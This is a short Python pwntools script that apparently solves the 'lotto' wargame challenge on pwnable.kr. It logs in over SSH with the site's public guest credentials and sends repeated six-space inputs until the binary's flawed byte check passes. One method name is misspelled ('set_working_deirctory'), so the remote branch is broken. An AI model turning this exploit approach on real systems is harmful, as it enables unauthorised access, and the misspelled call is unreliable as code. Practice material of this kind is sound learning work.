#coding=utf-8
from pwn import *

debug = 0
if debug:
  p = process('./lotto')
else:
  s = ssh(host = 'pwnable.kr', port = 2222, user = 'lotto', password = 'guest')
  s.set_working_deirctory('/home/lotto')
  p = s.process('./lotto')

for _ in range(256):
  res = p.recvuntil('Select Menu')
  if 'bad' not in res:
    print res
    break
  p.sendline('1')
  payload = ' '*6
  p.sendlineafter('Submit your 6 lotto bytes :', payload)
